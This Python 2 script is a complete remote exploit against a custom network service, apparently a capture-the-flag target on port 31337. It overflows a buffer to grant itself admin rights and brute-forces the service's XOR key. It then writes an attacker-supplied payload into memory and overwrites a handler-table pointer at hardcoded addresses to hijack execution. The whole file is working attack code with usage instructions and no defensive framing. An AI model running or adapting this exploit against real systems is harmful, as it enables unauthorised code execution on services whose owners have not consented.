#!/usr/bin/env python2

import socket
import sys

###############################
############### Client Class ##

class Client:
    def __init__(self, host='127.0.0.1', port='31337', do_print=True):
        self.host = host
        self.port = port
	self.do_print = do_print

    def send(self, command):
        cmdString = command[0]
        for e in command[1:]:
            cmdString +=  " " + str(len(e)) + e
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, int(self.port)))
        sock.send(cmdString)
        sock.setblocking(0)
        sock.settimeout(1.0)
        ret = sock.recv(4096)
	r = None
        while ret != "":
	  if self.do_print:
	    print ret,
	  if r == None:
	    r = ret
          ret = sock.recv(4096)
        sock.close()
	return r
###############################

###############################
################ Main Source ##

grant_admin = (72)*'A'+'\x01'

def bruteforce_xor():
  client = Client(sys.argv[1], sys.argv[2], False)
  founds = []
  i = 255
  while i:
    client.send(["0", grant_admin, 5*chr(i)])
    r = client.send(["1", chr(i)*4])
    xorkey = i
    import time
    time.sleep(0.002)
    if r.find("Lists") == 0:
      print "Xorkey cracked : %i" % i
      return i
    i -= 1
  return founds[-1]

def erase_xor(old_xor, new_xor):
  new_xor = chr(new_xor ^ old_xor)
  client = Client(sys.argv[1], sys.argv[2], False)
  client.send(["0", grant_admin, (512+512)*'A'+new_xor])
  client.send(["0", grant_admin, (512+511)*'A'+'\0'])
  i = 510
  while i:
    client.send(["0", grant_admin, (i)*'A'+new_xor])
    i -= 1

def send_payload(path, xorkey):
    def send_part_payload(client, xorkey, offset, part):
      table = []
      for i in range(0, len(part)):
	table.append(chr(ord(part[i]) ^ xorkey))
      part = ''.join(table)
      client.send(["0", grant_admin, 'A'*offset+part])

    client = Client(sys.argv[1], sys.argv[2], False)
    with file(sys.argv[3]) as f:
      payload = f.read().decode("hex")
    offset = len(payload)
    diff = offset % 4
    payload = payload + (4 - diff) * '*'
    diff = len(payload) / 4
    pointer = []
    handlercellsize = 4
    handlertabpos = 0x804bb00
    adminpassdpos = 0x804b660
    ptr_offset = (handlertabpos - adminpassdpos) / handlercellsize
    tmp =  adminpassdpos
    while tmp:
      pointer.append(chr(tmp & 0xFF))
      tmp >>= 8
    pointer = ''.join(pointer)
    payload = payload + pointer
    if xorkey == None:
      xorkey = bruteforce_xor()
    parts = payload.split('\x00')
    offset = len(payload)
    k = len(parts) - 1
    while k >= 0:
      part = parts[k]
      offset -= len(part) + 1
      send_part_payload(client, xorkey, offset + 1, part)
      k -= 1
    tab = -ptr_offset+diff
    return tab

def main():
    XorKey = None
    if len(sys.argv) < 4:
        print("Usage :\n%s <host IP address> <port> path_to_exploit (xorkey in decimal)" % sys.argv[0])
	print("Hint: if xorkey is not provided, the script will crack it. But keep in mind that'll generate a lot of warnings server-side.")
        sys.exit()
    if len(sys.argv) >= 5:
      XorKey = int(sys.argv[4])
    client = Client(sys.argv[1], sys.argv[2])
    tab = send_payload(sys.argv[3], XorKey)

    print "Exploit result :",
    client.send([str(tab), grant_admin, "I like granolas"])

if __name__ == "__main__":
  main()

###############################
